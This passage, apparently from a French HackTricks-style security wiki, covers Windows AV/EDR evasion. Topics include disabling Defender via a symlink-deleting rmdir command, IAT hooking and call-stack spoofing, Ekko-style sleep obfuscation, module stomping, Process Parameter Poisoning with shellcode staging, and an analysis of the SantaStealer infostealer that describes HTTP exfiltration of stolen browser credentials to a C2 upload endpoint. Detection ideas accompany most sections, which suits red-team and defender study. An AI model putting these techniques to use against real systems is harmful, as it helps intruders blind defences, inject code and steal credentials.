Options de post-exploitation
- DLL sideloading/code execution : Déposez/remplacez des DLL que Defender charge depuis son répertoire d’application afin d’exécuter du code dans les processus de Defender. Consultez la section ci-dessus : [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial : Supprimez le version-symlink afin qu’au prochain démarrage, le chemin configuré ne soit pas résolu et que Defender ne démarre pas :
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Notez que cette technique ne permet pas à elle seule une élévation de privilèges ; elle nécessite des droits administrateur.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Les Red teams peuvent déplacer l’évasion runtime de l’implant C2 vers le module cible lui-même en hookant son Import Address Table (IAT) et en faisant transiter certaines API par du code (PIC) contrôlé par l’attaquant et indépendant de la position. Cela généralise l’évasion au-delà de la petite surface d’API exposée par de nombreux kits (par exemple, CreateProcessA) et étend les mêmes protections aux BOFs et aux DLLs de post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approche générale
- Stager un blob PIC à côté du module cible à l’aide d’un reflective loader (préfixé ou compagnon). Le PIC doit être autonome et indépendant de la position.
- Lors du chargement de la DLL hôte, parcourir son IMAGE_IMPORT_DESCRIPTOR et patcher les entrées IAT des imports ciblés (par exemple, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) afin qu’elles pointent vers de minces wrappers PIC.
- Chaque wrapper PIC exécute les techniques d’évasion avant d’effectuer un tail-call vers l’adresse de la véritable API. Les techniques d’évasion courantes incluent :
- Mask/unmask de la mémoire autour de l’appel (par exemple, chiffrer les régions du beacon, passer de RWX à RX, modifier les noms/permissions des pages), puis restaurer l’état après l’appel.
- Call-stack spoofing : construire une stack bénigne et effectuer une transition vers l’API cible afin que l’analyse de la call stack se résolve vers les frames attendues.<sup>[[9]](#references)</sup>
- Pour assurer la compatibilité, exporter une interface afin qu’un script Aggressor (ou équivalent) puisse enregistrer les API à hooker pour Beacon, les BOFs et les DLLs de post-exploitation.

Pourquoi utiliser l’IAT hooking ici
- Fonctionne avec tout code utilisant l’import hooké, sans modifier le code de l’outil ni dépendre de Beacon pour proxyfier des API spécifiques.
- Couvre les DLLs de post-exploitation : le hooking de LoadLibrary* permet d’intercepter les chargements de modules (par exemple, System.Management.Automation.dll, clr.dll) et d’appliquer le même mask/stack evasion à leurs appels d’API.
- Restaure une utilisation fiable des commandes de post-exploitation qui créent des processus face aux détections basées sur la call stack, en wrappant CreateProcessA/W.

Schéma minimal d’IAT hook (pseudocode x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Appliquez le patch après les relocations/ASLR et avant la première utilisation de l'import. Les reflective loaders comme TitanLdr/AceLdr illustrent le hooking pendant le DllMain du module chargé.
- Gardez les wrappers petits et compatibles PIC ; résolvez la véritable API via la valeur IAT originale capturée avant le patch ou via LdrGetProcedureAddress.
- Utilisez des transitions RW → RX pour le PIC et évitez de laisser des pages accessibles en écriture et exécutables.

Call-stack spoofing stub
- Les stubs PIC de type Draugr construisent une fausse chaîne d'appels (adresses de retour dans des modules bénins), puis basculent vers la véritable API.
- Cela contourne les détections qui attendent des stacks canoniques depuis Beacon/BOFs vers des APIs sensibles.
- Associez-les à des techniques de stack cutting/stack stitching afin d'atterrir dans les frames attendues avant le prologue de l'API.

Operational integration
- Préfixez les DLL post-ex par le reflective loader afin que le PIC et les hooks s'initialisent automatiquement lors du chargement de la DLL.
- Utilisez un script Aggressor pour enregistrer les APIs cibles afin que Beacon et les BOFs bénéficient de manière transparente du même chemin d'évasion, sans modification du code.

Detection/DFIR considerations
- Intégrité de l'IAT : entrées qui se résolvent vers des adresses non-image (heap/anonymes) ; vérification périodique des pointeurs d'import.
- Anomalies de stack : adresses de retour n'appartenant pas aux images chargées ; transitions brusques vers du PIC non-image ; ascendance RtlUserThreadStart incohérente.
- Télémétrie du loader : écritures in-process dans l'IAT, activité précoce du DllMain qui modifie les import thunks, régions RX inattendues créées lors du chargement.
- Évasion du chargement d'image : si vous hookez LoadLibrary*, surveillez les chargements suspects d'assemblies automation/clr corrélés à des événements de memory masking.

Related building blocks and examples
- Reflective loaders qui effectuent un IAT patching pendant le chargement (p. ex. TitanLdr, AceLdr)
- Hooks de memory masking (p. ex. simplehook) et PIC de stack-cutting (stackcutting)
- Stubs PIC de call-stack spoofing (p. ex. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

Si vous contrôlez un reflective loader, vous pouvez hooker les imports **pendant** `ProcessImports()` en remplaçant le pointeur `GetProcAddress` du loader par un resolver personnalisé qui vérifie d'abord les hooks :<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Construisez un **resident PICO** (objet PIC persistant) qui survit après que le transient loader PIC s'est libéré.
- Exportez une fonction `setup_hooks()` qui écrase le resolver d'import du loader (p. ex. `funcs.GetProcAddress = _GetProcAddress`).
- Dans `_GetProcAddress`, ignorez les imports par ordinal et utilisez une recherche de hooks basée sur un hash, comme `__resolve_hook(ror13hash(name))`. Si un hook existe, retournez-le ; sinon, déléguez au véritable `GetProcAddress`.
- Enregistrez les cibles de hooks au link time avec les entrées Crystal Palace `addhook "MODULE$Func" "hook"`. Le hook reste valide car il réside dans le resident PICO.

Cela produit une **redirection IAT au moment de l'import** sans patcher la section de code de la DLL chargée après son chargement.

### Forcing hookable imports when the target uses PEB-walking

Les hooks au moment de l'import ne se déclenchent que si la fonction se trouve réellement dans l'IAT de la cible. Si un module résout les APIs via un PEB-walk + hash (sans entrée d'import), forcez un import réel afin que le chemin `ProcessImports()` du loader le voie :

- Remplacez la résolution d'exports par hash (p. ex. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) par une référence directe comme `&WaitForSingleObject`.
- Le compilateur émet une entrée IAT, ce qui permet l'interception lorsque le reflective loader résout les imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Au lieu de patcher `Sleep`, hookez les primitives réelles d'attente/IPC utilisées par l'implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Pour les attentes longues, encapsulez l'appel dans une chaîne d'obfuscation de type Ekko qui chiffre l'image en mémoire pendant l'inactivité :<sup>[[31]](#references)[[27]](#references)</sup>

- Utilisez `CreateTimerQueueTimer` pour planifier une séquence de callbacks qui appellent `NtContinue` avec des frames `CONTEXT` préparées.
- Chaîne typique (x64) : définir l'image sur `PAGE_READWRITE` → chiffrer avec RC4 via `advapi32!SystemFunction032` sur l'image mappée complète → effectuer l'attente bloquante → déchiffrer avec RC4 → **restaurer les permissions par section** en parcourant les sections PE → signaler la fin.
- `RtlCaptureContext` fournit un template `CONTEXT` ; clonez-le dans plusieurs frames et définissez les registres (`Rip/Rcx/Rdx/R8/R9`) pour invoquer chaque étape.

Détail opérationnel : retournez « success » pour les attentes longues (p. ex. `WAIT_OBJECT_0`) afin que l'appelant poursuive son exécution tandis que l'image est masquée. Ce pattern dissimule le module aux scanners pendant les fenêtres d'inactivité et évite la signature classique de `Sleep()` patché.

Detection ideas (telemetry-based)
- Rafales de callbacks `CreateTimerQueueTimer` pointant vers `NtContinue`.
- Utilisation de `advapi32!SystemFunction032` sur de grands buffers contigus de la taille de l'image.
- `VirtualProtect` sur une grande plage, suivi d'une restauration personnalisée des permissions par section.

### Runtime CFG registration for sleep-obfuscation gadgets

Sur les cibles activant CFG, le premier saut indirect vers un gadget au milieu d'une fonction, tel que `jmp [rbx]` ou `jmp rdi`, fait généralement crasher le processus avec `STATUS_STACK_BUFFER_OVERRUN`, car le gadget n'est pas présent dans les métadonnées CFG du module. Pour maintenir les chaînes de type Ekko/Kraken dans des processus renforcés :<sup>[[30]](#references)</sup>

- Enregistrez chaque destination indirecte utilisée par la chaîne avec `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` et des entrées `CFG_CALL_TARGET_VALID`.
- Pour les adresses situées dans des images chargées (`ntdll`, `kernel32`, `advapi32`), le `MEMORY_RANGE_ENTRY` doit commencer à la **base de l'image** et couvrir la **taille complète de l'image**.
- Pour les régions mappées manuellement/PIC/stomped, utilisez la **base de l'allocation** et la taille de l'allocation.
- Marquez non seulement le gadget de dispatch, mais aussi les exports atteints indirectement (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, les syscalls d'attente/événement) ainsi que toutes les sections exécutables contrôlées par l'attaquant qui deviendront des cibles indirectes.

Cela transforme les chaînes de sleep de type ROP/JOP, qui « ne fonctionnent que dans les processus sans CFG », en primitive réutilisable pour `explorer.exe`, les browsers, `svchost.exe` et autres endpoints compilés avec `/guard:cf`.

### CET-safe stack spoofing for sleeping threads

Le remplacement complet de `CONTEXT` est bruyant et peut échouer sur les systèmes utilisant le CET Shadow Stack, car un `Rip` spoofé doit toujours correspondre au shadow stack matériel. Un pattern de sleep-masking plus sûr est le suivant :<sup>[[30]](#references)</sup>

- Choisissez un autre thread du même processus et lisez les limites de stack de son `NT_TIB` / TEB (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Sauvegardez le TEB/TIB réel du thread actuel.
- Capturez le contexte réel du thread en sommeil avec `GetThreadContext`.
- Copiez **uniquement** le `Rip` réel dans le contexte spoofé, en laissant le `Rsp`/l'état de stack spoofé intacts.
- Pendant la fenêtre de sommeil, copiez le `NT_TIB` du thread spoofé dans le TEB actuel afin que les stack walkers déroulent la stack dans une plage légitime.
- Une fois l'attente terminée, restaurez le TIB et le contexte du thread d'origine.

Cela préserve un instruction pointer cohérent avec le CET tout en induisant en erreur les stack walkers des EDR qui font confiance aux métadonnées de stack du TEB pour valider les unwinds.

### APC-based alternative: Kraken Mask

Si le dispatch par timer queue est trop caractéristique, la même séquence sleep-encrypt-spoof-restore peut être exécutée depuis un helper thread suspendu au moyen d'APCs mises en file :<sup>[[27]](#references)</sup>

- Créez un helper thread avec `NtTestAlert` comme entrypoint.
- Mettez en file les frames `CONTEXT`/APCs préparées avec `NtQueueApcThread` et exécutez-les avec `NtAlertResumeThread`.
- Stockez l'état de la chaîne sur le heap plutôt que sur la stack du helper afin d'éviter d'épuiser la stack par défaut de 64 KB du thread.
- Utilisez `NtSignalAndWaitForSingleObject` pour signaler atomiquement l'événement de démarrage et bloquer.
- Suspendez le thread principal avant de restaurer le TIB/contexte (`NtSuspendThread` → restauration → `NtResumeThread`) afin de réduire la fenêtre de race durant laquelle un scanner pourrait intercepter une stack partiellement restaurée.

Cela remplace la signature `CreateTimerQueueTimer` + `NtContinue` par une signature helper-thread/APC, tout en conservant les mêmes objectifs de masking RC4 et de stack-spoofing.

Additional detection ideas
- `NtSetInformationVirtualMemory` avec `VmCfgCallTargetInformation` peu avant des sleeps, attentes ou dispatchs APC.
- `GetThreadContext`/`SetThreadContext` autour de `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ou `ConnectNamedPipe`.
- `NtQueryInformationThread` suivi d'écritures directes dans les limites de stack du TEB/TIB du thread actuel.
- Chaînes `NtQueueApcThread`/`NtAlertResumeThread` qui atteignent indirectement `SystemFunction032`, `VirtualProtect` ou des helpers de restauration des permissions de section.
- Utilisation répétée de signatures de gadgets courtes telles que `FF 23` (`jmp [rbx]`) ou `FF E7` (`jmp rdi`) comme pivots de dispatch dans des modules signés.


## Precision Module Stomping

Le module stomping exécute des payloads depuis la **section `.text` d'une DLL déjà mappée dans le processus cible** au lieu d'allouer une mémoire privée exécutable évidente ou de charger une nouvelle DLL sacrifiable. La cible de l'overwrite doit être une **image chargée, adossée au disque**, dont l'espace de code peut accueillir le payload sans corrompre les chemins d'exécution dont le processus a encore besoin.<sup>[[1]](#references)[[2]](#references)</sup>

### Reliable target selection

Le stomping naïf de modules courants tels que `uxtheme.dll` ou `comctl32.dll` est fragile : la DLL peut ne pas être chargée dans le processus distant, et une région de code trop petite fera crasher le processus. Un workflow plus fiable est le suivant :

1. Énumérez les modules du processus cible et conservez une **liste d'inclusion composée uniquement de noms** des DLL déjà chargées.
2. Construisez d'abord le payload et notez sa **taille exacte en octets**.
3. Analysez les DLL candidates sur le disque et comparez `Misc_VirtualSize` de la section PE **`.text`** à la taille du payload. Cela est plus important que la taille du fichier, car cette valeur reflète la taille de la section exécutable **lorsqu'elle est mappée en mémoire**.
4. Analysez l'**Export Address Table (EAT)** et choisissez le RVA d'une fonction exportée comme offset de début du stomp.
5. Calculez le **blast radius** : si le payload dépasse la limite de la fonction sélectionnée, il écrasera les exports adjacents disposés après celle-ci en mémoire.

Helpers typiques de recon/sélection observés dans la nature :
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Notes opérationnelles
- Privilégier les DLL déjà **chargées** dans le processus distant afin d’éviter la télémétrie de `LoadLibrary`/des chargements d’images inattendus.
- Privilégier les exports rarement exécutés par l’application cible ; sinon, des chemins de code normaux peuvent atteindre les octets stompés avant ou après la création du thread.
- Les implants volumineux nécessitent souvent de remplacer l’intégration du shellcode depuis un littéral de chaîne par un **tableau d’octets/initialiseur entre accolades**, afin que le buffer complet soit correctement représenté dans le code source de l’injecteur.

Idées de détection
- Écritures distantes dans des pages exécutables adossées à une image (`MEM_IMAGE`, `PAGE_EXECUTE*`) plutôt que dans les allocations privées RWX/RX plus courantes.
- Points d’entrée d’exports dont les octets en mémoire ne correspondent plus au fichier de référence sur disque.
- Threads distants ou pivots de contexte qui commencent leur exécution dans un export légitime d’une DLL dont les premiers octets ont été récemment modifiés.
- Séquences suspectes de `VirtualProtect(Ex)` / `WriteProcessMemory` ciblant des pages `.text` de DLL, suivies de la création d’un thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) est une technique d’**injection de processus / évasion d’EDR** qui évite le chemin classique d’écriture distante (`VirtualAllocEx` + `WriteProcessMemory`). Au lieu de copier des octets dans une cible déjà en cours d’exécution, elle exploite le fait que Windows **copie certains paramètres de démarrage de `CreateProcessW` dans le processus enfant** et les stocke dans `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Transporteurs pouvant être empoisonnés et copiés par `CreateProcessW`

Les transporteurs utiles sont :

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (avec `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Contraintes pratiques des transporteurs :

- `lpCommandLine` doit pointer vers une mémoire **inscriptible** pour `CreateProcessW`, et sa taille est limitée à **32 767 caractères Unicode**, terminateur nul compris.
- `lpEnvironment` doit être un bloc d’environnement Unicode composé de chaînes successives `NAME=VALUE\0`, terminées par un `\0` supplémentaire.
- `lpReserved` est officiellement réservé ; le mapping vers `ShellInfo` doit donc être considéré comme un détail d’implémentation plutôt que comme un contrat documenté stable.

Cela transforme la création normale d’un processus en **primitive de transfert de payload**. L’opérateur crée le processus enfant avec des données de démarrage contrôlées par l’attaquant et laisse Windows effectuer la copie inter-processus.

### Flux de recherche distante sans API d’écriture distante

Après la création de l’enfant, résoudre le buffer copié avec des primitives **en lecture seule** :

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obtenir `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lire le `PEB` distant
3. Suivre `PEB.ProcessParameters`
4. Lire `RTL_USER_PROCESS_PARAMETERS`
5. Utiliser le pointeur sélectionné :
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Flux minimal :
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Exécution du buffer de paramètres copié

La région de paramètres copiée est généralement `RW`, et non exécutable. Une chaîne P3 courante est la suivante :

1. Créer le processus normalement (pas en mode suspendu)
2. Rendre la page de paramètres choisie exécutable avec `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Réutiliser le handle du thread principal déjà retourné dans `PROCESS_INFORMATION`
4. Rediriger l’exécution avec `NtSetContextThread` (`CONTEXT_CONTROL`, écraser `RIP`)

Contrairement aux workflows classiques de thread hijacking, cela ne **requiert pas** `SuspendThread` / `ResumeThread` ; le contexte peut être directement modifié sur le handle du thread principal retourné.

Cela évite plusieurs API couramment surveillées pour l’injection :

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- souvent aussi `SuspendThread` / `ResumeThread`

### Limitation liée aux octets nuls et shellcode en plusieurs étapes

Les trois carriers sont des **données de type chaîne ou similaires à une chaîne**, de sorte qu’un payload brut contenant `0x00` est tronqué pendant le transfert. Une solution pratique consiste à utiliser un **premier stage sans octet nul** qui reconstruit les constantes à l’exécution, puis charge un second stage arbitraire.

Un modèle simple repose sur la synthèse de constantes basée sur XOR :
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
This permet à la première étape de construire des chaînes sur la stack, des arguments d’API, des chemins de DLL ou un shellcode loader de seconde étape sans intégrer d’octets nuls dans le paramètre transporté.

### Appels d’API basés sur la stack depuis la première étape

Lorsque la première étape doit appeler des API telles que `LoadLibraryA`, elle peut :

- pousser la chaîne/le buffer sur la stack de la cible
- réserver les **32 octets de shadow space x64**
- définir `RCX`, `RDX`, `R8`, `R9` sur des constantes ou des pointeurs relatifs à `RSP`
- conserver `RSP` **aligné sur 16 octets** avant l’appel

Une seconde étape peut ensuite être copiée de la stack vers une allocation `PAGE_READWRITE`, basculée vers `PAGE_EXECUTE_READ` avec `VirtualProtect`, puis exécutée, ce qui évite une allocation RWX directe.

### Idées de détection

Les auteurs mentionnent les opportunités de hunting suivantes :

- `VirtualProtectEx` / `NtProtectVirtualMemory` rendant **exécutables des pages de paramètres de processus**
- ce changement de protection suivi de `SetThreadContext` / `NtSetContextThread`
- lectures distantes du `PEB`, puis de `RTL_USER_PROCESS_PARAMETERS`
- valeurs `lpCommandLine`, `lpEnvironment` ou `STARTUPINFO.lpReserved` inhabituellement longues ou à entropie élevée lors de la création d’un processus

### Notes

- P3 est une **technique de transfert interprocessus**, et non une primitive d’exécution complète en elle-même : le paramètre copié nécessite toujours une modification des permissions d’exécution ainsi qu’une méthode de redirection de l’exécution.
- `RtlCreateProcessReflection` / Dirty Vanity a été envisagé par les auteurs, mais écarté car il fait appel en interne à des primitives suspectes telles que `NtWriteVirtualMemory` et `NtCreateThreadEx`.

## Tradecraft de SantaStealer pour l’évasion fileless et le vol d’identifiants

SantaStealer (alias BluelineStealer) illustre la manière dont les info-stealers modernes combinent l’AV bypass, l’anti-analyse et l’accès aux identifiants dans un workflow unique.<sup>[[24]](#references)</sup>

### Filtrage selon la disposition du clavier et délai en sandbox

- Un flag de configuration (`anti_cis`) énumère les dispositions de clavier installées via `GetKeyboardLayoutList`. Si une disposition cyrillique est trouvée, le sample crée un marqueur `CIS` vide et se termine avant d’exécuter les stealers, garantissant qu’il ne se déclenche jamais dans les locales exclues tout en laissant un artefact utile au hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Logique `check_antivm` en couches

- La variante A parcourt la liste des processus, calcule le hash de chaque nom avec une somme de contrôle glissante personnalisée et le compare à des blocklists intégrées pour les debuggers/sandboxes ; elle répète la somme de contrôle sur le nom de l’ordinateur et vérifie des répertoires de travail tels que `C:\analysis`.
- La variante B inspecte les propriétés du système (seuil minimal du nombre de processus, uptime récent), appelle `OpenServiceA("VBoxGuest")` pour détecter les additions VirtualBox et effectue des vérifications temporelles autour des pauses afin de repérer le single-stepping. Toute détection interrompt l’exécution avant le lancement des modules.

### Helper fileless + chargement réflexif avec double ChaCha20

- La DLL/EXE principale intègre un helper de credentials Chromium qui est soit déposé sur le disque, soit mappé manuellement en mémoire ; le mode fileless résout lui-même les imports/relocations afin qu’aucun artefact du helper ne soit écrit.
- Ce helper stocke une DLL de second stage chiffrée deux fois avec ChaCha20 (deux clés de 32 octets + des nonces de 12 octets). Après les deux passes, il charge le blob de manière réflexive (sans `LoadLibrary`) et appelle les exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, dérivés de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Les routines ChromElevator utilisent du process hollowing réflexif via direct-syscall pour injecter du code dans un navigateur Chromium actif, récupérer les clés AppBound Encryption et déchiffrer les mots de passe/cookies/cartes bancaires directement depuis les bases de données SQLite malgré le durcissement d’ABE.


### Collecte modulaire en mémoire et exfiltration HTTP fragmentée

- `create_memory_based_log` parcourt une table globale de pointeurs de fonctions `memory_generators` et crée un thread par module activé (Telegram, Discord, Steam, captures d’écran, documents, extensions de navigateur, etc.). Chaque thread écrit ses résultats dans des buffers partagés et signale son nombre de fichiers après une fenêtre d’attente d’environ 45 s.
- Une fois terminé, tout est compressé avec la bibliothèque `miniz` liée statiquement sous `%TEMP%\\Log.zip`. `ThreadPayload1` attend ensuite 15 s et transmet l’archive par fragments de 10 Mo via HTTP POST vers `http://<C2>:6767/upload`, en usurpant une boundary de navigateur `multipart/form-data` (`----WebKitFormBoundary***`). Chaque fragment ajoute `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` facultatif, et le dernier fragment ajoute `complete: true` afin que le C2 sache que la réassemblage est terminé.

## Références

- [1] [Techniques avancées d’évasion : Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, plus de passe-droit pour les malwares](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – exemple](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – exemple](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC avec usurpation de call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nouvelle chaîne d’infection et obfuscation basée sur ConfuserEx pour le stealer DarkCloud](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Faut-il faire confiance à votre zero trust ? Contourner les contrôles de posture de Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Avant ToolShell : exploration des précédentes opérations de ransomware de Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading : exploitation des exports forwardés](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventaire des exports forwardés de Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [16] [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [17] [Microsoft – Référence EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Lanceur CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Contrer les EDR avec la protection Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Briser la coque protectrice de Windows Defender avec la technique de redirection de dossiers](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Référence de la commande mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Sous le rideau Pure : du RAT au builder puis au coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer arrive en ville : un nouveau stealer ambitieux](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Déchiffrement de Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader : vaincre les malwares Node.js avec le traçage des API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty : mettre Adaptix au repos avec Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Empoisonnement des paramètres de processus](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II : CFG, CET et usurpation de stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Obfuscation de sommeil Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Masquer votre Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Exploiter Chrome Remote Desktop dans les opérations Red Team : guide pratique](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)

{{#include ../banners/hacktricks-training.md}}
